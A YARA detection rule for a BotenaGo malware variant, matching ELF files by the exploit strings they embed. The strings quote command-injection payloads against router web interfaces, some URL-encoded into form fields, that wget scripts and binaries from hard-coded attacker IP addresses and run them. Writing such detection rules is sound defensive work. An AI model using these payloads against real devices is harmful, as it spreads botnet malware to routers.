rule Linux_BotenaGo_2021_10_10 {
  meta:
    description = "Detects BotenaGo variant"
    author      = "Mehmet Ali Kerimoglu a.k.a. CYB3RMX"
    date        = "2022-04-04"
    hash1       = "0c395715bfeb8f89959be721cd2f614d2edb260614d5a21e90cc4c142f5d83ad"

  strings:
    $exp1    = "cd /tmp;wget http://37.0.11.220/a/wget.sh;chmod 777 wget.sh;sh wget.sh selfrep.dlink;rm -rf wget.sh;" wide ascii
    $exp2    = "target_addr=%3Brm%20-rf%20/var/tmp/stainfo%3Bwget%20http://107.172.30.215/arm/arm5/arm7/i586/i686/m68k/mips/mipsel/powerpc/sh4/sparc/x86_64bot.mips%20-O%20->/var/tmp/stainfo%3Bchmod%20777%20/var/tmp/stainfo%3B/var/tmp/stainfo%20selfrep.gponfiber&waninf=1_INTERNET_R_VID_" wide ascii
    $exp3    = "GET /ping.cgi?pingIpAddress=;cd%20/mnt;wget%20http://107.172.30.215/multi/wget.sh%20-O-%20>sfs;chmod%20777%20sfs;sh%20sfs%20selfrep.comtrend;&sessionKey=" wide ascii
    $exp4    = "http://purenetworks.com/HNAP1/GetDeviceSettings/`cd && cd tmp && export PATH=$PATH:. && 00010203040506070809101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899" wide ascii
    $exp5    = "/adv,/cgi-bin/weblogin.cgi?username=admin%27%3B" wide ascii
    $server1 = "Boa/0.94.14Server"

  condition:
    uint16(0) == 0x457f and ((all of ($exp*)) and (all of ($server*)))
}